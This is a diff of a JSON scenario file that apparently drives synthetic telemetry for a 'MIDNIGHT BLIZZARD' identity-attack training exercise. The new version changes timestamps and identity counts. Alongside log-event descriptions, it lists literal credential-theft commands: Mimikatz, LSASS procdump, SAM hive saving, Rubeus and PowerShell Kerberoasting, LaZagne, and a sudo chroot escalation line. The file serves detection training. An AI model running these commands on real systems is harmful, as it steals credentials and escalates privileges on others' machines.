@@ -1,173 +1,173 @@
-{
-  "scenarioName": "MIDNIGHT BLIZZARD hybrid identity credential access",
-  "startTime": "2026-05-01T10:30:00.0000000Z",
-  "telemetryWindow": {
-    "endTime": "2026-05-01T12:00:00.0000000Z",
-    "lookbackDays": 7,
-    "earliestNormalTime": "2026-04-24T12:00:00.0000000Z"
-  },
-  "tenantDomain": "usag-cyber.local",
-  "adDomain": "USAG-CYBER",
-  "infrastructure": {
-    "domainControllers": 2,
-    "windows11Endpoints": 10,
-    "ubuntuEndpoints": 5,
-    "entraConnectServers": 1
-  },
-  "identities": {
-    "users": 10,
-    "serviceAccounts": 5
-  },
-  "compromisedUser": "victor.alvarez@usag-cyber.local",
-  "initialDevice": "WIN11-04.usag-cyber.local",
-  "identityAttackVectors": [
-    {
-      "Title": "Benign device code sign-in from a compliant device (teaching twin)",
-      "Technique": "None",
-      "Offset": -52,
-      "Command": "EntraIdSignInEvents deviceCode sign-in for alice.weber from 198.51.100.50 on a compliant, Azure AD joined device"
-    },
-    {
-      "Title": "Device code phishing mail delivered with a genuine microsoft.com/devicelogin lure",
-      "Technique": "T1566.002,T1078.004",
-      "Offset": -45,
-      "Command": "EmailEvents and EmailUrlInfo inbound mail from secure-docs@usag-cyber-portal.example to victor.alvarez"
-    },
-    {
-      "Title": "Victim clicks the device code authorization link",
-      "Technique": "T1566.002",
-      "Offset": -40,
-      "Command": "UrlClickEvents click through to https://microsoft.com/devicelogin"
-    },
-    {
-      "Title": "Attacker redeems the device code token from unmanaged infrastructure",
-      "Technique": "T1078.004,T1550.001",
-      "Offset": -37,
-      "Command": "SigninLogs and EntraIdSignInEvents deviceCode sign-in for victor.alvarez from 185.225.73.18 using Microsoft Azure CLI"
-    },
-    {
-      "Title": "Risky interactive Entra sign-in from unfamiliar infrastructure",
-      "Technique": "T1078.004,T1110.003,T1090.002",
-      "Offset": 0,
-      "Command": "SigninLogs high-risk interactive sign-in with MFA from 185.225.73.18"
-    },
-    {
-      "Title": "Suspicious OAuth consent grants mailbox and file scopes",
-      "Technique": "T1528,T1098.003,T1550.001",
-      "Offset": 5,
-      "Command": "CloudAppEvents OAuthAppConsentGranted for USAG Cyber Sync Helper with Mail.Read Files.Read.All offline_access"
-    },
-    {
-      "Title": "Service principal credential added for OAuth persistence",
-      "Technique": "T1098.001,T1550.001",
-      "Offset": 6,
-      "Command": "AuditLogs Add service principal credentials and AADServicePrincipalSignInLogs client-secret sign-in to Microsoft Graph"
-    },
-    {
-      "Title": "Graph API mailbox, file, and directory collection",
-      "Technique": "T1087.004,T1114.002,T1530",
-      "Offset": 7,
-      "Command": "GraphAPIAuditEvents and MicrosoftGraphActivityLogs read messages, OneDrive, users, and SharePoint content"
-    }
-  ],
-  "attackVectors": [
-    {
-      "Title": "Credentials in Registry Script",
-      "Technique": "T1552.002",
-      "Offset": 15,
-      "Command": "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\ProgramData\\wrstage\\collect-reg-creds.ps1"
-    },
-    {
-      "Title": "Dump SAM Registry Hive via reg save Command",
-      "Technique": "T1003.002",
-      "Offset": 22,
-      "Command": "reg.exe save HKLM\\SAM C:\\ProgramData\\wrstage\\sam.save /y"
-    },
-    {
-      "Title": "Collect Browser Data via Esentutl using PowerShell Script",
-      "Technique": "T1555.003",
-      "Offset": 27,
-      "Command": "esentutl.exe /y \"C:\\Users\\victor.alvarez\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\" /d C:\\ProgramData\\wrstage\\LoginData.db"
-    },
-    {
-      "Title": "Kerberoasting using Rubeus",
-      "Technique": "T1558.003",
-      "Offset": 35,
-      "Command": "Rubeus.exe kerberoast /ldapfilter:\"(servicePrincipalName=*)\" /nowrap /outfile:C:\\ProgramData\\wrstage\\roast.txt"
-    },
-    {
-      "Title": "Kerberoasting using PowerShell Empire's Invoke-Kerberoast Script",
-      "Technique": "T1558.003",
-      "Offset": 42,
-      "Command": "powershell.exe -NoProfile -ExecutionPolicy Bypass Import-Module .\\PowerView.ps1; Invoke-Kerberoast -OutputFormat Hashcat"
-    },
-    {
-      "Title": "Dump LSASS Process to Minidump File",
-      "Technique": "T1003.001",
-      "Offset": 50,
-      "Command": "procdump64.exe -accepteula -ma lsass.exe C:\\ProgramData\\wrstage\\lsass.dmp"
-    },
-    {
-      "Title": "Dump Passwords using PwDump7",
-      "Technique": "T1003.002",
-      "Offset": 56,
-      "Command": "PwDump7.exe -o C:\\ProgramData\\wrstage\\pwdump7.txt"
-    },
-    {
-      "Title": "Dump Passwords using gsecdump",
-      "Technique": "T1003.001",
-      "Offset": 60,
-      "Command": "gsecdump.exe -a > C:\\ProgramData\\wrstage\\gsecdump.txt"
-    },
-    {
-      "Title": "Dump Passwords using LaZagne",
-      "Technique": "T1555",
-      "Offset": 65,
-      "Command": "LaZagne.exe all -oN -output C:\\ProgramData\\wrstage\\lazagne"
-    },
-    {
-      "Title": "Dump Windows Passwords with Obfuscated Mimikatz",
-      "Technique": "T1003.001",
-      "Offset": 70,
-      "Command": "rundll32.exe C:\\ProgramData\\wrstage\\kiwi.dll,StartW /sekurlsa::logonpasswords /exit"
-    },
-    {
-      "Title": "Dump Windows Passwords with Original Mimikatz",
-      "Technique": "T1003.001",
-      "Offset": 73,
-      "Command": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\""
-    }
-  ],
-  "linuxAttackVectors": [
-    {
-      "Title": "Suspicious SSH attempts against Ubuntu server",
-      "Technique": "T1021.004",
-      "Offset": 61,
-      "Command": "sshd authentication activity in /var/log/auth.log"
-    },
-    {
-      "Title": "Suspicious sudo chroot usage on Ubuntu server",
-      "Technique": "T1548.003",
-      "Offset": 65,
-      "Command": "sudo -R /tmp/.cache/nss /bin/bash -p"
-    },
-    {
-      "Title": "Unix shell and auditd evidence on Ubuntu server",
-      "Technique": "T1059.004",
-      "Offset": 68,
-      "Command": "auditd process execution evidence for sudo and bash"
-    },
-    {
-      "Title": "Synthetic Python privilege-check helper on Ubuntu server",
-      "Technique": "T1059.006",
-      "Offset": 70,
-      "Command": "python3 /tmp/.cache/oracle_privcheck.py --check sudo-cve-2025-32463 --target oracle"
-    },
-    {
-      "Title": "Synthetic Go binary accesses Oracle database over TNS",
-      "Technique": "T1005",
-      "Offset": 72,
-      "Command": "/tmp/.cache/ora_collect_linux_amd64 --target 10.42.20.35:1521 --service ORCL --query-name finance-user-catalog"
-    }
-  ]
+﻿{
+    "scenarioName":  "MIDNIGHT BLIZZARD hybrid identity credential access",
+    "startTime":  "2026-07-25T15:54:06.8479365Z",
+    "telemetryWindow":  {
+                            "endTime":  "2026-07-25T17:24:06.8479365Z",
+                            "lookbackDays":  7,
+                            "earliestNormalTime":  "2026-07-18T17:24:06.8479365Z"
+                        },
+    "tenantDomain":  "usag-cyber.local",
+    "adDomain":  "USAG-CYBER",
+    "infrastructure":  {
+                           "domainControllers":  2,
+                           "windows11Endpoints":  10,
+                           "ubuntuEndpoints":  5,
+                           "entraConnectServers":  1
+                       },
+    "identities":  {
+                       "users":  6000,
+                       "serviceAccounts":  4000
+                   },
+    "compromisedUser":  "victor.alvarez@usag-cyber.local",
+    "initialDevice":  "WIN11-04.usag-cyber.local",
+    "identityAttackVectors":  [
+                                  {
+                                      "Title":  "Benign device code sign-in from a compliant device (teaching twin)",
+                                      "Technique":  "None",
+                                      "Offset":  -52,
+                                      "Command":  "EntraIdSignInEvents deviceCode sign-in for alice.weber from 198.51.100.50 on a compliant, Azure AD joined device"
+                                  },
+                                  {
+                                      "Title":  "Device code phishing mail delivered with a genuine microsoft.com/devicelogin lure",
+                                      "Technique":  "T1566.002,T1078.004",
+                                      "Offset":  -45,
+                                      "Command":  "EmailEvents and EmailUrlInfo inbound mail from secure-docs@usag-cyber-portal.example to victor.alvarez"
+                                  },
+                                  {
+                                      "Title":  "Victim clicks the device code authorization link",
+                                      "Technique":  "T1566.002",
+                                      "Offset":  -40,
+                                      "Command":  "UrlClickEvents click through to https://microsoft.com/devicelogin"
+                                  },
+                                  {
+                                      "Title":  "Attacker redeems the device code token from unmanaged infrastructure",
+                                      "Technique":  "T1078.004,T1550.001",
+                                      "Offset":  -37,
+                                      "Command":  "SigninLogs and EntraIdSignInEvents deviceCode sign-in for victor.alvarez from 185.225.73.18 using Microsoft Azure CLI"
+                                  },
+                                  {
+                                      "Title":  "Risky interactive Entra sign-in from unfamiliar infrastructure",
+                                      "Technique":  "T1078.004,T1110.003,T1090.002",
+                                      "Offset":  0,
+                                      "Command":  "SigninLogs high-risk interactive sign-in with MFA from 185.225.73.18"
+                                  },
+                                  {
+                                      "Title":  "Suspicious OAuth consent grants mailbox and file scopes",
+                                      "Technique":  "T1528,T1098.003,T1550.001",
+                                      "Offset":  5,
+                                      "Command":  "CloudAppEvents OAuthAppConsentGranted for USAG Cyber Sync Helper with Mail.Read Files.Read.All offline_access"
+                                  },
+                                  {
+                                      "Title":  "Service principal credential added for OAuth persistence",
+                                      "Technique":  "T1098.001,T1550.001",
+                                      "Offset":  6,
+                                      "Command":  "AuditLogs Add service principal credentials and AADServicePrincipalSignInLogs client-secret sign-in to Microsoft Graph"
+                                  },
+                                  {
+                                      "Title":  "Graph API mailbox, file, and directory collection",
+                                      "Technique":  "T1087.004,T1114.002,T1530",
+                                      "Offset":  7,
+                                      "Command":  "GraphAPIAuditEvents and MicrosoftGraphActivityLogs read messages, OneDrive, users, and SharePoint content"
+                                  }
+                              ],
+    "attackVectors":  [
+                          {
+                              "Title":  "Credentials in Registry Script",
+                              "Technique":  "T1552.002",
+                              "Offset":  15,
+                              "Command":  "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\ProgramData\\wrstage\\collect-reg-creds.ps1"
+                          },
+                          {
+                              "Title":  "Dump SAM Registry Hive via reg save Command",
+                              "Technique":  "T1003.002",
+                              "Offset":  22,
+                              "Command":  "reg.exe save HKLM\\SAM C:\\ProgramData\\wrstage\\sam.save /y"
+                          },
+                          {
+                              "Title":  "Collect Browser Data via Esentutl using PowerShell Script",
+                              "Technique":  "T1555.003",
+                              "Offset":  27,
+                              "Command":  "esentutl.exe /y \"C:\\Users\\victor.alvarez\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\" /d C:\\ProgramData\\wrstage\\LoginData.db"
+                          },
+                          {
+                              "Title":  "Kerberoasting using Rubeus",
+                              "Technique":  "T1558.003",
+                              "Offset":  35,
+                              "Command":  "Rubeus.exe kerberoast /ldapfilter:\"(servicePrincipalName=*)\" /nowrap /outfile:C:\\ProgramData\\wrstage\\roast.txt"
+                          },
+                          {
+                              "Title":  "Kerberoasting using PowerShell Empire\u0027s Invoke-Kerberoast Script",
+                              "Technique":  "T1558.003",
+                              "Offset":  42,
+                              "Command":  "powershell.exe -NoProfile -ExecutionPolicy Bypass Import-Module .\\PowerView.ps1; Invoke-Kerberoast -OutputFormat Hashcat"
+                          },
+                          {
+                              "Title":  "Dump LSASS Process to Minidump File",
+                              "Technique":  "T1003.001",
+                              "Offset":  50,
+                              "Command":  "procdump64.exe -accepteula -ma lsass.exe C:\\ProgramData\\wrstage\\lsass.dmp"
+                          },
+                          {
+                              "Title":  "Dump Passwords using PwDump7",
+                              "Technique":  "T1003.002",
+                              "Offset":  56,
+                              "Command":  "PwDump7.exe -o C:\\ProgramData\\wrstage\\pwdump7.txt"
+                          },
+                          {
+                              "Title":  "Dump Passwords using gsecdump",
+                              "Technique":  "T1003.001",
+                              "Offset":  60,
+                              "Command":  "gsecdump.exe -a \u003e C:\\ProgramData\\wrstage\\gsecdump.txt"
+                          },
+                          {
+                              "Title":  "Dump Passwords using LaZagne",
+                              "Technique":  "T1555",
+                              "Offset":  65,
+                              "Command":  "LaZagne.exe all -oN -output C:\\ProgramData\\wrstage\\lazagne"
+                          },
+                          {
+                              "Title":  "Dump Windows Passwords with Obfuscated Mimikatz",
+                              "Technique":  "T1003.001",
+                              "Offset":  70,
+                              "Command":  "rundll32.exe C:\\ProgramData\\wrstage\\kiwi.dll,StartW /sekurlsa::logonpasswords /exit"
+                          },
+                          {
+                              "Title":  "Dump Windows Passwords with Original Mimikatz",
+                              "Technique":  "T1003.001",
+                              "Offset":  73,
+                              "Command":  "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\""
+                          }
+                      ],
+    "linuxAttackVectors":  [
+                               {
+                                   "Title":  "Suspicious SSH attempts against Ubuntu server",
+                                   "Technique":  "T1021.004",
+                                   "Offset":  61,
+                                   "Command":  "sshd authentication activity in /var/log/auth.log"
+                               },
+                               {
+                                   "Title":  "Suspicious sudo chroot usage on Ubuntu server",
+                                   "Technique":  "T1548.003",
+                                   "Offset":  65,
+                                   "Command":  "sudo -R /tmp/.cache/nss /bin/bash -p"
+                               },
+                               {
+                                   "Title":  "Unix shell and auditd evidence on Ubuntu server",
+                                   "Technique":  "T1059.004",
+                                   "Offset":  68,
+                                   "Command":  "auditd process execution evidence for sudo and bash"
+                               },
+                               {
+                                   "Title":  "Synthetic Python privilege-check helper on Ubuntu server",
+                                   "Technique":  "T1059.006",
+                                   "Offset":  70,
+                                   "Command":  "python3 /tmp/.cache/oracle_privcheck.py --check sudo-cve-2025-32463 --target oracle"
+                               },
+                               {
+                                   "Title":  "Synthetic Go binary accesses Oracle database over TNS",
+                                   "Technique":  "T1005",
+                                   "Offset":  72,
+                                   "Command":  "/tmp/.cache/ora_collect_linux_amd64 --target 10.42.20.35:1521 --service ORCL --query-name finance-user-catalog"
+                               }
+                           ]
 }
